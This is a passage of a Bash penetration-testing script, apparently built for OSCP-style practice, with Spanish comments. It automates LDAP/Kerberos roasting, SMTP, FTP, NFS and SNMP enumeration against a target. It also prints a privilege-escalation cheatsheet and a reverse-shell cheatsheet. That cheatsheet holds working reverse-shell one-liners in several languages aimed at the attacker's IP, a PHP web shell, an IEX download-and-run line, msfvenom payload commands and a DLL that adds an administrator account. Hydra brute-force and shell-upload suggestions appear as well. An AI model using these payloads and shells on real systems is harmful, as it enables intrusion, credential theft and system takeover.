            [[ ! -f "$_vhost_wl" ]] && _vhost_wl="/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
            if [[ -f "$_vhost_wl" ]]; then
                log_info "🌐 Running VHost enumeration against ${WHITE}$DOMAIN${NC}..."
                run_cmd "VHost-Enum" \
                    "gobuster vhost -u $base_url -w $_vhost_wl --domain $DOMAIN --append-domain -t 50 -k -o $LOOT_DIR/web/vhosts${p_suffix}.txt" \
                    "$LOOT_DIR/web/vhosts${p_suffix}.txt"
                # Report discovered vhosts
                if [[ -s "$LOOT_DIR/web/vhosts${p_suffix}.txt" ]]; then
                    local _vh_count
                    _vh_count=$(grep -cP 'Status:\s*(200|301|302|403)' "$LOOT_DIR/web/vhosts${p_suffix}.txt" 2>/dev/null || echo 0)
                    if (( _vh_count > 0 )); then
                        log_ok "🎯 ${WHITE}${_vh_count}${NC} VHosts encontrados!"
                        add_finding "VHOSTS: $_vh_count virtual hosts encontrados en $DOMAIN (puerto $p)"
                        # Extract and offer to add discovered vhosts
                        while IFS= read -r _vline; do
                            local _vhost_name
                            _vhost_name=$(echo "$_vline" | awk '{print $2}' | tr -d '"')
                            if [[ -n "$_vhost_name" ]] && ! grep -qP "\b${_vhost_name}\b" /etc/hosts 2>/dev/null; then
                                echo "$_vhost_name" >> "$LOOT_DIR/web/discovered_hostnames.txt"
                            fi
                        done < <(grep -P 'Status:\s*(200|301|302|403)' "$LOOT_DIR/web/vhosts${p_suffix}.txt" 2>/dev/null)
                    fi
                fi
            else
                log_warn "VHost wordlist no encontrada. Instalar seclists: sudo apt install seclists"
            fi
        elif [[ -z "$DOMAIN" ]]; then
            log_info "VHost enum omitido (sin DOMAIN). Se configura automáticamente si se detecta un redirect."
        fi

        # Parse findings
        parse_scan_findings "$LOOT_DIR/web/whatweb${p_suffix}.txt" "WhatWeb"
        parse_scan_findings "$LOOT_DIR/web/gobuster${p_suffix}.txt" "Gobuster"
        log_ok "Completed enumeration for port $p"
    done
}

# =============================================================================
# -- 6. LDAP / Active Directory ------------------------------------------------
# =============================================================================
ldap_enum() {
    require_ip   || return
    require_loot || return
    banner
    log_section "LDAP / ACTIVE DIRECTORY (AUTO)"

    if [[ -z "$DOMAIN" ]]; then
        log_warn "No domain configured. Some LDAP tools might fail."
    fi

    local dc_path=""
    if [[ -n "$DOMAIN" ]]; then
        dc_path="DC=$(echo "$DOMAIN" | sed 's/\./,DC=/g')"
    fi

    tmux_run "LDAP-Enum" \
        "echo '[*] Nmap LDAP scripts...'; nmap -p389,636 --script ldap-rootdse,ldap-search -Pn $IP -oN $LOOT_DIR/ldap/ldap_nmap.txt; \
         echo '[*] anonymous ldapsearch...'; ldapsearch -x -H ldap://$IP -s base namingcontexts 2>&1 | tee $LOOT_DIR/ldap/ldap_namingcontexts.txt; \
         [[ -n \"$dc_path\" ]] && ldapsearch -x -H ldap://$IP -b \"$dc_path\" '(objectClass=*)' 2>&1 | tee $LOOT_DIR/ldap/ldap_anon_full.txt; \
         echo '[+] LDAP enum completado.'" \
        "$LOOT_DIR/ldap/ldap_nmap.txt"

    if command -v impacket-GetNPUsers &>/dev/null && [[ -n "$DOMAIN" ]]; then
        # Sin credenciales → AS-REP Roasting y Kerberoasting anónimo
        tmux_run "ASREPRoast" \
            "echo '[*] AS-REP Roasting without auth...'; \
             impacket-GetNPUsers -no-pass -usersfile /usr/share/seclists/Usernames/top-usernames-shortlist.txt -format hashcat '${DOMAIN}/' -dc-ip $IP 2>&1 | tee $LOOT_DIR/ldap/asrep_roast.txt; \
             echo '[*] Kerberoasting (GetUserSPNs)...'; \
             impacket-GetUserSPNs '${DOMAIN}/' -dc-ip $IP -no-pass -outputfile $LOOT_DIR/ldap/kerberoast_hashes.txt 2>&1 | tee $LOOT_DIR/ldap/kerberoast_output.txt; \
             echo '[+] AS-REP + Kerberoasting completado.'" \
            "$LOOT_DIR/ldap/asrep_roast.txt"
    fi

    # -- Si hay credenciales -> LDAP/AD autenticado adicional ------------------
    if [[ -n "$USER_CRED" && -n "$PASS_CRED" && -n "$DOMAIN" ]]; then
        log_info "Credenciales detectadas ($USER_CRED) → lanzando LDAP/AD autenticado..."
        tmux_run "LDAP-Auth" \
            "echo '[*] ldapsearch autenticado...'; \
             ldapsearch -x -H ldap://$IP -D '${USER_CRED}@${DOMAIN}' -w '$PASS_CRED' -b '$(echo $DOMAIN | sed 's/\./,DC=/g;s/^/DC=/')' '(objectClass=user)' sAMAccountName 2>&1 | tee $LOOT_DIR/ldap/ldap_auth_users.txt; \
             echo '[*] NXC LDAP autenticado...'; \
             $CME ldap $IP -u '$USER_CRED' -p '$PASS_CRED' --users 2>&1 | tee $LOOT_DIR/ldap/nxc_ldap_users.txt; \
             $CME ldap $IP -u '$USER_CRED' -p '$PASS_CRED' --groups 2>&1 | tee $LOOT_DIR/ldap/nxc_ldap_groups.txt; \
             echo '[*] Kerberoasting autenticado...'; \
             impacket-GetUserSPNs '${DOMAIN}/${USER_CRED}:${PASS_CRED}' -dc-ip $IP -request -outputfile $LOOT_DIR/ldap/kerberoast_auth.txt 2>&1; \
             echo '[*] AS-REP Roasting autenticado...'; \
             impacket-GetNPUsers '${DOMAIN}/${USER_CRED}:${PASS_CRED}' -dc-ip $IP -request -format hashcat -outputfile $LOOT_DIR/ldap/asrep_auth.txt 2>&1; \
             echo '[+] LDAP/AD autenticado completado.'" \
            "$LOOT_DIR/ldap/ldap_auth_users.txt"
    elif [[ -n "$USER_CRED" && -n "$PASS_CRED" && -z "$DOMAIN" ]]; then
        log_warn "Credenciales disponibles pero sin DOMAIN configurado. Configura el dominio con [C] para LDAP autenticado."
    fi

    # 💡 HACK suggestions for LDAP/AD
    add_finding "💡 HACK: LDAP domain dump → ldapdomaindump -u '' -p '' ldap://$IP -o $LOOT_DIR/ldap/dump/"
    [[ -n "$DOMAIN" ]] && add_finding "💡 HACK: BloodHound → bloodhound-python -c All -d $DOMAIN -ns $IP"

    log_ok "LDAP Enumeration launched in background tmux sessions."
    echo ""; read -rp "  Press ENTER to continue..."
}


# =============================================================================
# -- 6.5 SMTP Enumeration (Port 25) --------------------------------------------
# =============================================================================
smtp_enum() {
    require_ip   || return
    require_loot || return
    banner
    log_section "SMTP ENUMERATION (AUTO)"

    run_cmd "SMTP Banner" "echo 'QUIT' | nc -nv $IP 25 -w 5 2>&1 | tee $LOOT_DIR/scans/smtp_banner.txt" ""
    run_cmd "Nmap SMTP" "nmap -p25 --script smtp-commands,smtp-enum-users,smtp-vuln* $IP -oN $LOOT_DIR/scans/smtp_nmap.txt" ""
    
    if command -v smtp-user-enum &>/dev/null; then
        run_cmd "SMTP Auth" "smtp-user-enum -M VRFY -U $WORDLIST_USERS -t $IP 2>&1 | tee $LOOT_DIR/scans/smtp_users.txt" "$LOOT_DIR/scans/smtp_users.txt"
        
        # Extract valid users found
        if grep -q "exists" "$LOOT_DIR/scans/smtp_users.txt" 2>/dev/null; then
            add_finding "📧 SMTP: Valid users found via VRFY!"
            grep "exists" "$LOOT_DIR/scans/smtp_users.txt" | awk '{print $2}' | sort -u >> "$LOOT_DIR/creds/users_smtp.txt"
        fi
    fi

    # 💡 HACK suggestions for SMTP
    add_finding "💡 HACK: SMTP relay test → swaks --to root --from test@test.com --server $IP --body 'test'"
    add_finding "💡 HACK: SMTP brute → hydra -l root -P /usr/share/wordlists/rockyou.txt smtp://$IP"
}


# =============================================================================
# -- 7a. FTP Enumeration --------------------------------------------------------------
# =============================================================================
ftp_enum() {
    require_ip   || return
    require_loot || return
    banner
    log_section "FTP ENUMERATION (AUTO)"

    run_cmd "FTP checks" \
        "nmap -p21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor,ftp-proftpd-backdoor -Pn $IP -oN $LOOT_DIR/scans/ftp_full.txt" \
        "$LOOT_DIR/scans/ftp_full.txt"
    
    if grep -iq "Anonymous FTP login allowed" "$LOOT_DIR/scans/ftp_full.txt"; then
        log_ok "Anonymous FTP login allowed!"
        add_finding "📂 FTP: Anonymous login allowed!"
        add_finding "💡 HACK: FTP download all → wget -m ftp://anonymous:@$IP"
        add_finding "💡 HACK: FTP PUT test → curl -T shell.php ftp://anonymous:@$IP/"
    else
        add_finding "💡 HACK: FTP brute → hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://$IP"
    fi
}


# =============================================================================
# -- 7b. SSH Enumeration --------------------------------------------------------------
# =============================================================================
ssh_enum() {
    require_ip   || return
    require_loot || return
    banner
    log_section "SSH ENUMERATION (AUTO)"

    run_cmd "SSH info" \
        "nmap -p22 --script ssh-auth-methods,ssh-hostkey,ssh2-enum-algos -Pn $IP -oN $LOOT_DIR/scans/ssh.txt" \
        "$LOOT_DIR/scans/ssh.txt"

    # 💡 HACK suggestions for SSH
    add_finding "💡 HACK: SSH legacy connection → ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 user@$IP"
    add_finding "💡 HACK: SSH key found? → ssh2john id_rsa > hash.txt && john hash.txt --wordlist=rockyou.txt"
}


# =============================================================================
# -- 7b. UDP Scan --------------------------------------------------------------
# =============================================================================
udp_scan() {
    require_ip   || return
    require_loot || return
    banner
    log_section "UDP PORT SCAN"

    echo -e "  ${WHITE}[1]${NC} UDP top 20 ports (fast)"
    echo -e "  ${WHITE}[2]${NC} UDP top 100 ports"
    echo -e "  ${WHITE}[3]${NC} UDP specific: SNMP(161), TFTP(69), DNS(53), NTP(123)"
    echo -e "  ${WHITE}[b]${NC} Back"
    echo ""
    read -rp "  Option: " choice

    case $choice in
        1)
            run_cmd "UDP top 20" \
                "sudo nmap -sU --top-ports 20 --min-rate 1000 -Pn $IP -oN $LOOT_DIR/scans/udp.txt" \
                "$LOOT_DIR/scans/udp.txt"
            ;;
        2)
            run_cmd "UDP top 100" \
                "sudo nmap -sU --top-ports 100 --min-rate 1000 -Pn $IP -oN $LOOT_DIR/scans/udp.txt" \
                "$LOOT_DIR/scans/udp.txt"
            ;;
        3)
            run_cmd "UDP targeted" \
                "sudo nmap -sU -p53,69,123,161,162,500 -Pn $IP -oN $LOOT_DIR/scans/udp.txt" \
                "$LOOT_DIR/scans/udp.txt"
            ;;
        b|B) return ;;
    esac

    # Auto-extract UDP ports
    PORTS_UDP=$(grep -oP '^\d+(?=/udp\s+open)' "$LOOT_DIR/scans/udp.txt" 2>/dev/null \
        | tr '\n' ',' | sed 's/,$//')
    if [[ -n "$PORTS_UDP" ]]; then
        echo "$PORTS_UDP" > "$LOOT_DIR/scans/open_ports_udp.txt"
        log_ok "UDP ports open: ${WHITE}$PORTS_UDP${NC}"
        add_finding "UDP abiertos: $PORTS_UDP"

        # Auto-recommend
        echo ",$PORTS_UDP," | grep -q ",161," && \
            log_warn "SNMP (161/udp) abierto → ${YELLOW}usa opción [N] para enumerar SNMP${NC}"
        echo ",$PORTS_UDP," | grep -q ",69," && \
            add_finding "TFTP (69/udp) abierto — probar tftp $IP"
        echo ",$PORTS_UDP," | grep -q ",53," && \
            add_finding "DNS (53/udp) abierto — probar zone transfer"
    else
        log_warn "No se detectaron puertos UDP abiertos."
    fi

    echo ""; read -rp "  Press ENTER to continue..."
}

# =============================================================================
# -- 7c. SNMP Enumeration -----------------------------------------------------
# =============================================================================
snmp_enum() {
    require_ip   || return
    require_loot || return
    banner
    log_section "SNMP ENUMERATION (AUTO)"

    local snmp_wl="/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt"
    [[ ! -f "$snmp_wl" ]] && snmp_wl="/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt"
    [[ ! -f "$snmp_wl" ]] && snmp_wl="/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt"
    
    if [[ -f "$snmp_wl" ]]; then
        run_cmd "onesixtyone" "onesixtyone -c $snmp_wl $IP 2>&1 | tee $LOOT_DIR/scans/snmp_communities.txt" "$LOOT_DIR/scans/snmp_communities.txt"
    fi

    run_cmd "snmpwalk public" "snmpwalk -v2c -c public $IP 2>&1 | tee $LOOT_DIR/scans/snmpwalk.txt" "$LOOT_DIR/scans/snmpwalk.txt"
    run_cmd "snmp-check" "snmp-check $IP 2>&1 | tee $LOOT_DIR/scans/snmpcheck.txt" "$LOOT_DIR/scans/snmpcheck.txt"
}

# =============================================================================
# -- 7d. NFS Enumeration ------------------------------------------------------
# =============================================================================
nfs_enum() {
    require_ip   || return
    require_loot || return
    banner
    log_section "NFS ENUMERATION (AUTO)"

    run_cmd "showmount" "showmount -e $IP 2>&1 | tee $LOOT_DIR/scans/nfs_shares.txt" "$LOOT_DIR/scans/nfs_shares.txt"
    if grep -qP '^\/' "$LOOT_DIR/scans/nfs_shares.txt" 2>/dev/null; then
        add_finding "🔓 NFS shares exportadas detectadas"
        # Auto-mount logic matching auto_recon
        local _nfs_mount_dir="/tmp/nfs_mount_$$"
        while IFS= read -r _nfs_line; do
            local _share_path
            _share_path=$(echo "$_nfs_line" | awk '{print $1}')
            if [[ -n "$_share_path" && "$_share_path" == /* ]]; then
                log_info "Montando NFS share: ${WHITE}$IP:$_share_path${NC}"
                mkdir -p "$_nfs_mount_dir"
                if sudo mount -t nfs "$IP:$_share_path" "$_nfs_mount_dir" -o nolock,timeo=10 2>/dev/null; then
                    ls -laR "$_nfs_mount_dir/" 2>&1 | tee "$LOOT_DIR/scans/nfs_contents_$(echo "$_share_path" | tr '/' '_').txt"
                    local _nfs_file_count
                    _nfs_file_count=$(find "$_nfs_mount_dir" -type f 2>/dev/null | wc -l)
                    add_finding "📂 NFS $IP:$_share_path — $_nfs_file_count archivos accesibles"
                    if find "$_nfs_mount_dir" -name 'id_rsa' -o -name 'id_ed25519' -o -name 'authorized_keys' 2>/dev/null | grep -q .; then
                        add_finding "🔑 NFS: SSH KEYS encontradas en $IP:$_share_path"
                    fi
                    sudo umount "$_nfs_mount_dir" 2>/dev/null
                else
                    log_warn "No se pudo montar $IP:$_share_path (permisos?)"
                fi
            fi
        done < <(grep -P '^/' "$LOOT_DIR/scans/nfs_shares.txt" 2>/dev/null)
        rmdir "$_nfs_mount_dir" 2>/dev/null
    fi

    tmux_run "NFS" "nmap -p111,2049 --script nfs-ls,nfs-showmount,nfs-statfs -Pn $IP -oN $LOOT_DIR/scans/nfs_nmap.txt" ""

    # 💡 HACK suggestions for NFS
    add_finding "💡 HACK: NFS no_root_squash → crear SUID bash: cp /bin/bash nfs_mount/ && chmod +s nfs_mount/bash"
    add_finding "💡 HACK: NFS UID spoof → useradd -u <UID> fakeuser && su fakeuser && access files"

    echo ""; read -rp "  Press ENTER to continue..."
}

# =============================================================================
# -- Privesc Helpers (LinPEAS / WinPEAS) --------------------------------------
# =============================================================================
privesc_helper() {
    banner
    log_section "PRIVESC CHEATSHEET"

    local my_ip
    my_ip=$(get_attacker_ip)

    echo ""
    echo -e "  ${LPURPLE}+------------------------------------------------------------------------------${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${BOLD}PRIVILEGE ESCALATION - Guia Rapida OSCP${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}Necesitas descargar linpeas/winpeas u otros binarios? -> Menu principal -> [BIN]${NC}"
    echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"

    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- 🐧 LINUX → Checklist Manual ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}sudo -l${NC}                             ${DIM}-> SIEMPRE PRIMERO! GTFOBins${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}find / -perm -4000 -type f 2>/dev/null${NC}  ${DIM}-> SUID binaries${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}find / -writable -type f 2>/dev/null${NC}    ${DIM}-> archivos escribibles${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}cat /etc/crontab; ls -la /etc/cron*${NC}    ${DIM}-> cronjobs${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}ps aux | grep root${NC}                    ${DIM}-> procesos de root${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}cat /etc/passwd | grep sh\$${NC}             ${DIM}-> usuarios con shell${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}find / -name '*.bak' -o -name '*.conf' -o -name '*.log' 2>/dev/null${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}cat /home/*/.bash_history 2>/dev/null${NC}  ${DIM}-> historial de comandos${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}uname -a${NC}                              ${DIM}-> version kernel (kernel exploits)${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}id; groups${NC}                            ${DIM}-> grupos especiales (docker, lxd, disk)${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}getcap -r / 2>/dev/null${NC}               ${DIM}-> capabilities${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Herramientas automaticas (descargar con [BIN]):${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}./linpeas.sh | tee linpeas.txt${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}./pspy64${NC}  ${DIM}-> ver cronjobs ocultos en tiempo real${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}./lse.sh -l1${NC}  ${DIM}-> enumeracion ligera${NC}"

    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- 🪟 WINDOWS → Checklist Manual ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}whoami /priv${NC}                          ${DIM}-> SeImpersonate? SeBackup? SeDebug?${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}whoami /groups${NC}                        ${DIM}-> grupos privilegiados${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}net user${NC}                              ${DIM}-> usuarios locales${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}net localgroup Administrators${NC}         ${DIM}-> quien es admin${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}systeminfo${NC}                            ${DIM}-> OS version, hotfixes${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}cmdkey /list${NC}                          ${DIM}-> credenciales guardadas${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}reg query HKLM /f password /t REG_SZ /s${NC}  ${DIM}-> passwords en registro${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}sc query state= all | findstr SERVICE_NAME${NC}  ${DIM}-> servicios${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}icacls C:\\Users\\* 2>nul${NC}               ${DIM}-> permisos de carpetas${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}schtasks /query /fo LIST /v${NC}           ${DIM}-> tareas programadas${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Vectores Clave (Misconfigs OSCP):${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated${NC} ${DIM}-> Si 1, inyectar MSI${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated${NC} ${DIM}-> Se requiere en ambos${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"C:\\Windows\\\\\" |findstr /i /v \"\\\"\"${NC} ${DIM}-> Unquoted Paths${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}accesschk.exe /accepteula -uwcqv \"Authenticated Users\" *${NC} ${DIM}-> Service Binary / DLL Hijacking${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}--- DLL HIJACKING via PATH (Carpetas Ejecutables con permisos) ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}powershell -c \"\\\$env:Path -split ';' | % { if (Test-Path \\\$_) { \\\$(icacls \\\$_ 2>\\\$null) -match 'Everyone|Users|Authenticated' } }\"${NC} ${DIM}-> Buscar [VULNERABLE] PATHs${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Quick wins (si tienes SeImpersonatePrivilege):${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}PrintSpoofer64.exe -i -c cmd${NC}          ${DIM}-> Windows 10/Server 2016-2019${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}GodPotato-NET4.exe -cmd 'cmd /c whoami'${NC} ${DIM}-> Windows Server 2012-2022${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}JuicyPotatoNG.exe -t * -p cmd.exe${NC}    ${DIM}-> fallback clasico${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Herramientas automaticas (descargar con [BIN]):${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}winPEASx64.exe${NC}  ${DIM}-> enumeracion completa${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}Seatbelt.exe -group=all${NC}  ${DIM}-> alternativa mas silenciosa${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}powershell -ep bypass -c \". .\\PowerUp.ps1; Invoke-AllChecks\"${NC}"
    echo -e "  ${LPURPLE}+------------------------------------------------------------------------------${NC}"

    echo ""; read -rp "  Presiona ENTER para continuar..."
}

# =============================================================================
# -- Reverse Shell Cheatsheet -------------------------------------------------
# =============================================================================
revshell_cheatsheet() {
    banner
    log_section "REVERSE SHELL CHEATSHEET"

    # Get attacker IP
    local my_ip
    my_ip=$(get_attacker_ip)
    read -rp "  $(echo -e "${CYAN}Tu IP (atacante)${NC} [default: $my_ip]: ")" input_ip
    my_ip="${input_ip:-$my_ip}"
    read -rp "  $(echo -e "${CYAN}Puerto listener${NC} [default: 443]: ")" lport
    lport="${lport:-443}"

    echo ""
    echo -e "  ${LCYAN}${BOLD}--- LISTENER ---${NC}"
    echo -e "  ${YELLOW}nc -lvnp $lport${NC}"
    echo -e "  ${YELLOW}rlwrap nc -lvnp $lport${NC}  ${DIM}← con readline${NC}"
    echo ""

    echo -e "  ${LCYAN}${BOLD}--- LINUX ---${NC}"
    echo ""
    echo -e "  ${WHITE}Bash:${NC}"
    echo -e "  ${YELLOW}bash -i >& /dev/tcp/$my_ip/$lport 0>&1${NC}"
    echo -e "  ${YELLOW}bash -c 'bash -i >& /dev/tcp/$my_ip/$lport 0>&1'${NC}"
    echo ""
    echo -e "  ${WHITE}Bash (mkfifo):${NC}"
    echo -e "  ${YELLOW}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $my_ip $lport >/tmp/f${NC}"
    echo ""
    echo -e "  ${WHITE}Python:${NC}"
    echo -e "  ${YELLOW}python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$my_ip\",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'${NC}"
    echo ""
    echo -e "  ${WHITE}PHP:${NC}"
    echo -e "  ${YELLOW}php -r '\$sock=fsockopen(\"$my_ip\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'${NC}"
    echo ""
    echo -e "  ${WHITE}Perl:${NC}"
    echo -e "  ${YELLOW}perl -e 'use Socket;\$i=\"$my_ip\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'${NC}"
    echo ""

    echo -e "  ${WHITE}Ruby:${NC}"
    echo -e "  ${YELLOW}ruby -rsocket -e 'f=TCPSocket.open(\"$my_ip\",$lport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'${NC}"
    echo ""
    echo -e "  ${WHITE}Web Shell PHP (subir como .php):${NC}"
    echo -e "  ${YELLOW}<?php system(\$_GET['cmd']); ?>${NC}  ${DIM}<- http://TARGET/shell.php?cmd=id${NC}"
    echo ""
    echo -e "  ${LCYAN}${BOLD}--- WINDOWS ---${NC}"
    echo ""
    echo -e "  ${WHITE}PowerShell (one-liner):${NC}"
    echo -e "  ${YELLOW}powershell -nop -c \"\\\$c=New-Object Net.Sockets.TCPClient('$my_ip',$lport);\\\$s=\\\$c.GetStream();[byte[]]\\\$b=0..65535|%{0};while((\\\$i=\\\$s.Read(\\\$b,0,\\\$b.Length))-ne 0){;\\\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\\$b,0,\\\$i);exec(\\\$d)2>&1|Out-String}\"${NC}"
    echo ""
    echo -e "  ${WHITE}nc.exe:${NC}"
    echo -e "  ${YELLOW}nc.exe $my_ip $lport -e cmd.exe${NC}"
    echo ""

    echo -e "  ${WHITE}ConPtyShell (shell interactiva completa Windows):${NC}"
    echo -e "  ${YELLOW}IEX(IWR 'http://$my_ip/Invoke-ConPtyShell.ps1');Invoke-ConPtyShell $my_ip $lport${NC}"
    echo ""

    echo -e "  ${LCYAN}${BOLD}--- MSFVENOM -> Generar Payloads ---${NC}"
    echo ""
    echo -e "  ${WHITE}Linux ELF:${NC}"
    echo -e "  ${YELLOW}msfvenom -p linux/x64/shell_reverse_tcp LHOST=$my_ip LPORT=$lport -f elf -o shell.elf${NC}"
    echo -e "  ${DIM}  -> chmod +x shell.elf && ./shell.elf${NC}"
    echo ""
    echo -e "  ${WHITE}Windows EXE:${NC}"
    echo -e "  ${YELLOW}msfvenom -p windows/x64/shell_reverse_tcp LHOST=$my_ip LPORT=$lport -f exe -o shell.exe${NC}"
    echo ""
    echo -e "  ${WHITE}Windows DLL (Hijacking manual):${NC}"
    echo -e "  ${YELLOW}msfvenom -p windows/x64/shell_reverse_tcp LHOST=$my_ip LPORT=$lport -f dll -o evil.dll${NC}"
    echo -e "  ${DIM}  -> Opcio\x6E C (Add User 'dave3'):${NC} ${YELLOW}cat <<EOF > evil.c${NC}"
    echo -e "  ${YELLOW}  #include <windows.h>
  #include <stdlib.h>
  BOOL APIENTRY DllMain(HANDLE h, DWORD r, LPVOID res) {
    if(r==DLL_PROCESS_ATTACH){ system(\"net user dave3 password123! /add && net localgroup administrators dave3 /add\"); }
    return TRUE;
  }
EOF${NC}"
    echo -e "  ${YELLOW}  x86_64-w64-mingw32-gcc evil.c --shared -o version.dll${NC}"
    echo ""
    echo -e "  ${WHITE}Windows MSI (Evade algunas restricciones de ejecución):${NC}"
    echo -e "  ${YELLOW}msfvenom -p windows/x64/shell_reverse_tcp LHOST=$my_ip LPORT=$lport -a x64 --platform Windows -f msi -o rev.msi${NC}"
    echo ""
    echo -e "  ${WHITE}PHP webshell:${NC}"
    echo -e "  ${YELLOW}msfvenom -p php/reverse_php LHOST=$my_ip LPORT=$lport -f raw -o shell.php${NC}"
    echo ""
    echo -e "  ${WHITE}WAR (Tomcat):${NC}"
    echo -e "  ${YELLOW}msfvenom -p java/jsp_shell_reverse_tcp LHOST=$my_ip LPORT=$lport -f war -o shell.war${NC}"
    echo ""
    echo -e "  ${WHITE}ASP (IIS):${NC}"
    echo -e "  ${YELLOW}msfvenom -p windows/shell_reverse_tcp LHOST=$my_ip LPORT=$lport -f asp -o shell.asp${NC}"
    echo ""

    echo -e "  ${LCYAN}${BOLD}--- UPGRADE TTY ---${NC}"
    echo ""
    echo -e "  ${WHITE}Metodo 1 — Python (mas comun):${NC}"
    echo -e "  ${CYAN}1.${NC} ${YELLOW}python3 -c 'import pty;pty.spawn(\"/bin/bash\")'${NC}"
    echo -e "  ${CYAN}2.${NC} ${YELLOW}Ctrl+Z${NC}"
    echo -e "  ${CYAN}3.${NC} ${YELLOW}stty raw -echo; fg${NC}"
    echo -e "  ${CYAN}4.${NC} ${YELLOW}export TERM=xterm${NC}"
    echo -e "  ${CYAN}5.${NC} ${YELLOW}stty rows 50 cols 200${NC}"
    echo ""
    echo -e "  ${WHITE}Metodo 2 — script (cuando NO existe python):${NC}"
    echo -e "  ${YELLOW}script /dev/null -c bash${NC}  ${DIM}-> Ctrl+Z -> stty raw -echo; fg -> export TERM=xterm${NC}"
    echo ""
    echo -e "  ${WHITE}Metodo 3 — rlwrap (antes del listener, mas facil):${NC}"
    echo -e "  ${YELLOW}rlwrap nc -lvnp $lport${NC}  ${DIM}<- Tab, flechas y Ctrl+C funcionan directamente${NC}"
    echo ""

    echo ""; read -rp "  Press ENTER to continue..."
}

# =============================================================================
# -- File Transfer Cheatsheet -------------------------------------------------
# =============================================================================
filetransfer_cheatsheet() {
    banner
    log_section "FILE TRANSFER CHEATSHEET"

    local my_ip
    my_ip=$(get_attacker_ip)
    read -rp "  $(echo -e "${CYAN}Tu IP (atacante)${NC} [default: $my_ip]: ")" input_ip
    my_ip="${input_ip:-$my_ip}"

    echo ""
    echo -e "  ${LCYAN}${BOLD}--- SERVIR ARCHIVOS DESDE KALI ---${NC}"
    echo ""
    echo -e "  ${WHITE}Python HTTP:${NC}"
    echo -e "  ${YELLOW}python3 -m http.server 80${NC}"
    echo ""
    echo -e "  ${WHITE}SMB server (impacket):${NC}"
